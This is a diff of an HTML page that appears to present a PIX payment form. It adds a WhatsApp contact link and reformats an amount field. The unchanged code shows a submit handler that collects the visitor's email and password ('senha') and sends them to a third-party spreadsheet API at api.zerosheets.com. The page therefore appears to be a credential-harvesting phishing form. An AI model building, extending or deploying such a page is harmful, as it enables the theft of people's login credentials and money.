@@ -6,7 +6,7 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="assets/css/main.css" />
 		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
-	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
 	<body class="is-preload">
 	    
@@ -20,7 +20,9 @@
 					<nav id="nav">
   <a href="#" class="icon solid fa-user"><span>Home</span></a>
 
-  
+<a href="https://wa.me/5585981369468" target="_blank">
+  <i class="fa fa-whatsapp" style="font-size:40px"></i>
+</a>
 </nav>
 	<!-- Main -->
 					<div id="main">
@@ -116,7 +118,7 @@ divDados.appendChild(pixDiv);
 
 
       <label for="valor">Valor:</label>
-      <input type="number" id="valor" name="valor"><br><br>
+      <input type="text" id="valor" name="valor" pattern="[0-9]+(\.[0-9]{2})?" placeholder="R$ 00,00">
       <label for="operacao">tipo de transição:</label>
 <select id="operacao" name="operacao">
 <option value="saque">pix</option>
@@ -136,6 +138,8 @@ formulario.addEventListener('submit', (event) => {
   const senha = document.getElementById('senha').value;
   const valor = document.getElementById('valor').value;
   const operacao = document.getElementById('operacao').value;
+
+
 
   if (email && senha) {
     fetch('https://api.zerosheets.com/v1/k3u', {
